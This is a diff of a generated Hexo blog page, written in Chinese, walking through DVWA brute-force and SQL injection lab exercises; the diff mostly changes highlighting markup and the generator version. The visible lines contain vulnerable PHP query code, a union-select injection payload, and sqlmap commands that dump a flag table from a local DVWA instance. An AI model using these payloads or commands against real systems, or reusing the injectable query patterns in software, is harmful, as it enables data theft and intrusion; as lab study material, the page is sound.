@@ -52,7 +52,7 @@
 
   <script  src="/js/utils.js" ></script>
   <script  src="/js/color-schema.js" ></script>
-<meta name="generator" content="Hexo 5.4.0"></head>
+<meta name="generator" content="Hexo 6.3.0"></head>
 
 
 <body>
@@ -265,20 +265,20 @@
 <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;
     <span class="hljs-comment">// Sanitise username input</span>
     <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];
-    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
+    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
 
     <span class="hljs-comment">// Sanitise password input</span>
     <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];
-    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
-    <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );
+    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
+    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );
 
     <span class="hljs-comment">// Check the database</span>
     <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;
-    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
+    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
 
-    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;
+    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;
         <span class="hljs-comment">// Get users details</span>
-        <span class="hljs-variable">$row</span>    = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> );
+        <span class="hljs-variable">$row</span>    = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> );
         <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];
 
         <span class="hljs-comment">// Login successful</span>
@@ -287,11 +287,11 @@
     &#125;
     <span class="hljs-keyword">else</span> &#123;
         <span class="hljs-comment">// Login failed</span>
-        sleep( <span class="hljs-number">2</span> );
+        <span class="hljs-title function_ invoke__">sleep</span>( <span class="hljs-number">2</span> );
         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;
     &#125;
 
-    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);
+    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);
 &#125;
 
 <span class="hljs-meta">?&gt;</span></code></pre></div>
@@ -306,26 +306,26 @@
 
 <span class="hljs-keyword">if</span>( <span class="hljs-keyword">isset</span>( <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;Login&#x27;</span> ] ) ) &#123;
     <span class="hljs-comment">// Check Anti-CSRF token</span>
-    checkToken( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );
+    <span class="hljs-title function_ invoke__">checkToken</span>( <span class="hljs-variable">$_REQUEST</span>[ <span class="hljs-string">&#x27;user_token&#x27;</span> ], <span class="hljs-variable">$_SESSION</span>[ <span class="hljs-string">&#x27;session_token&#x27;</span> ], <span class="hljs-string">&#x27;index.php&#x27;</span> );
 
     <span class="hljs-comment">// Sanitise username input</span>
     <span class="hljs-variable">$user</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;username&#x27;</span> ];
-    <span class="hljs-variable">$user</span> = stripslashes( <span class="hljs-variable">$user</span> );
-    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
+    <span class="hljs-variable">$user</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$user</span> );
+    <span class="hljs-variable">$user</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$user</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
 
     <span class="hljs-comment">// Sanitise password input</span>
     <span class="hljs-variable">$pass</span> = <span class="hljs-variable">$_GET</span>[ <span class="hljs-string">&#x27;password&#x27;</span> ];
-    <span class="hljs-variable">$pass</span> = stripslashes( <span class="hljs-variable">$pass</span> );
-    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((trigger_error(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
-    <span class="hljs-variable">$pass</span> = md5( <span class="hljs-variable">$pass</span> );
+    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">stripslashes</span>( <span class="hljs-variable">$pass</span> );
+    <span class="hljs-variable">$pass</span> = ((<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; <span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$pass</span> ) : ((<span class="hljs-title function_ invoke__">trigger_error</span>(<span class="hljs-string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="hljs-string">&quot;&quot;</span> : <span class="hljs-string">&quot;&quot;</span>));
+    <span class="hljs-variable">$pass</span> = <span class="hljs-title function_ invoke__">md5</span>( <span class="hljs-variable">$pass</span> );
 
     <span class="hljs-comment">// Check database</span>
     <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class="hljs-subst">$user</span>&#x27; AND password = &#x27;<span class="hljs-subst">$pass</span>&#x27;;&quot;</span>;
-    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
+    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
 
-    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; mysqli_num_rows( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;
+    <span class="hljs-keyword">if</span>( <span class="hljs-variable">$result</span> &amp;&amp; <span class="hljs-title function_ invoke__">mysqli_num_rows</span>( <span class="hljs-variable">$result</span> ) == <span class="hljs-number">1</span> ) &#123;
         <span class="hljs-comment">// Get users details</span>
-        <span class="hljs-variable">$row</span>    = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> );
+        <span class="hljs-variable">$row</span>    = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> );
         <span class="hljs-variable">$avatar</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;avatar&quot;</span>];
 
         <span class="hljs-comment">// Login successful</span>
@@ -334,15 +334,15 @@
     &#125;
     <span class="hljs-keyword">else</span> &#123;
         <span class="hljs-comment">// Login failed</span>
-        sleep( rand( <span class="hljs-number">0</span>, <span class="hljs-number">3</span> ) );
+        <span class="hljs-title function_ invoke__">sleep</span>( <span class="hljs-title function_ invoke__">rand</span>( <span class="hljs-number">0</span>, <span class="hljs-number">3</span> ) );
         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;
     &#125;
 
-    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);
+    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);
 &#125;
 
 <span class="hljs-comment">// Generate Anti-CSRF token</span>
-generateSessionToken();
+<span class="hljs-title function_ invoke__">generateSessionToken</span>();
 
 <span class="hljs-meta">?&gt;</span>
 </code></pre></div>
@@ -366,9 +366,9 @@ generateSessionToken();
 
     <span class="hljs-comment">// Check database</span>
     <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = &#x27;<span class="hljs-subst">$id</span>&#x27; LIMIT 1;&quot;</span>;
-    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );
+    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;Something went wrong.&lt;/pre&gt;&#x27;</span> );
     <span class="hljs-comment">// Get results</span>
-    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;
+    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;
         <span class="hljs-comment">// Get values</span>
         <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];
         <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];
@@ -377,7 +377,7 @@ generateSessionToken();
         <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;pre&gt;ID: <span class="hljs-subst">&#123;$id&#125;</span>&lt;br /&gt;First name: <span class="hljs-subst">&#123;$first&#125;</span>&lt;br /&gt;Surname: <span class="hljs-subst">&#123;$last&#125;</span>&lt;/pre&gt;&quot;</span>;
     &#125;
 
-    ((is_null(<span class="hljs-variable">$___mysqli_res</span> = mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);        
+    ((<span class="hljs-title function_ invoke__">is_null</span>(<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="hljs-literal">false</span> : <span class="hljs-variable">$___mysqli_res</span>);        
 &#125;
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
@@ -404,11 +404,11 @@ generateSessionToken();
 <div class="hljs"><pre><code class="hljs capnproto"><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">union</span> select <span class="hljs-number">1</span>,group_concat(fl4g) <span class="hljs-keyword">from</span> flag <span class="hljs-comment">#</span></code></pre></div>
 
 <p><img src="https://i.loli.net/2020/11/06/BNp8ZiPgy2MdHvC.png" srcset="/img/loading.gif" alt="sqll-1.png"></p>
-<h4 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><div class="hljs"><pre><code class="hljs jboss-cli">python2 sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-params">--batch</span> <span class="hljs-params">--dbs</span>
+<h4 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><div class="hljs"><pre><code class="hljs stylus">python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-attr">--batch</span> <span class="hljs-attr">--dbs</span>
 
-python2 sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-params">--batch</span> -D dvwa -T flag <span class="hljs-params">--columns</span>
+python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-attr">--batch</span> -D dvwa -T flag <span class="hljs-attr">--columns</span>
 
-python2 sqlmap.py -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-params">--cookie=</span><span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-params">--batch</span> -D dvwa -T flag -C fl4g <span class="hljs-params">--dump</span></code></pre></div>
+python2 sqlmap<span class="hljs-selector-class">.py</span> -u <span class="hljs-string">&quot;http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</span> <span class="hljs-attr">--cookie</span>=<span class="hljs-string">&quot;security=low; PHPSESSID=0477644f8a563ab1fd2f2ecba45bd2d1&quot;</span> <span class="hljs-attr">--batch</span> -D dvwa -T flag -C fl4g <span class="hljs-attr">--dump</span></code></pre></div>
 
 <p><img src="https://i.loli.net/2020/11/06/f87DeH6rKI2JhzY.png" srcset="/img/loading.gif" alt="sqll-5.png"></p>
 <h3 id="medium-1"><a href="#medium-1" class="headerlink" title="medium"></a>medium</h3><p>与low级别相比较，这里的id值不需要用户输入，只需要选择，但是可以抓包修改id的内容</p>
@@ -442,13 +442,13 @@ id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <
     <span class="hljs-comment">// Get input</span>
     <span class="hljs-variable">$id</span> = <span class="hljs-variable">$_POST</span>[ <span class="hljs-string">&#x27;id&#x27;</span> ];
 
-    <span class="hljs-variable">$id</span> = mysqli_real_escape_string(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$id</span>);
+    <span class="hljs-variable">$id</span> = <span class="hljs-title function_ invoke__">mysqli_real_escape_string</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$id</span>);
 
     <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT first_name, last_name FROM users WHERE user_id = <span class="hljs-subst">$id</span>;&quot;</span>;
-    <span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
+    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>], <span class="hljs-variable">$query</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
 
     <span class="hljs-comment">// Get results</span>
-    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = mysqli_fetch_assoc( <span class="hljs-variable">$result</span> ) ) &#123;
+    <span class="hljs-keyword">while</span>( <span class="hljs-variable">$row</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_assoc</span>( <span class="hljs-variable">$result</span> ) ) &#123;
         <span class="hljs-comment">// Display values</span>
         <span class="hljs-variable">$first</span> = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;first_name&quot;</span>];
         <span class="hljs-variable">$last</span>  = <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;last_name&quot;</span>];
@@ -462,10 +462,10 @@ id=<span class="hljs-number">-1</span> <span class="hljs-keyword">union</span> <
 <span class="hljs-comment">// This is used later on in the index.php page</span>
 <span class="hljs-comment">// Setting it here so we can close the database connection in here like in the rest of the source scripts</span>
 <span class="hljs-variable">$query</span>  = <span class="hljs-string">&quot;SELECT COUNT(*) FROM users;&quot;</span>;
-<span class="hljs-variable">$result</span> = mysqli_query(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
-<span class="hljs-variable">$number_of_rows</span> = mysqli_fetch_row( <span class="hljs-variable">$result</span> )[<span class="hljs-number">0</span>];
+<span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysqli_query</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>],  <span class="hljs-variable">$query</span> ) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span>( <span class="hljs-string">&#x27;&lt;pre&gt;&#x27;</span> . ((<span class="hljs-title function_ invoke__">is_object</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>])) ? <span class="hljs-title function_ invoke__">mysqli_error</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="hljs-variable">$___mysqli_res</span> = <span class="hljs-title function_ invoke__">mysqli_connect_error</span>()) ? <span class="hljs-variable">$___mysqli_res</span> : <span class="hljs-literal">false</span>)) . <span class="hljs-string">&#x27;&lt;/pre&gt;&#x27;</span> );
+<span class="hljs-variable">$number_of_rows</span> = <span class="hljs-title function_ invoke__">mysqli_fetch_row</span>( <span class="hljs-variable">$result</span> )[<span class="hljs-number">0</span>];
 
-mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]);
+<span class="hljs-title function_ invoke__">mysqli_close</span>(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&quot;___mysqli_ston&quot;</span>]);
 <span class="hljs-meta">?&gt;</span></code></pre></div>
 
 <p><code>mysqli_real_escape_string()</code> 函数转义在 SQL 语句中使用的字符串中的特殊字符。</p>
@@ -473,10 +473,10 @@ mysqli_close(<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-strin
 <h4 id="sqlmap注入-1"><a href="#sqlmap注入-1" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h4><p>因为是post注入，所以需要抓取数据包保存下来。</p>
 <p>如图，可以将其保存在sqlmap.py的路径下</p>
 <p><img src="https://i.loli.net/2020/11/06/hySBmFe4zoTgvNq.png" srcset="/img/loading.gif" alt="sqlm-5.png"></p>
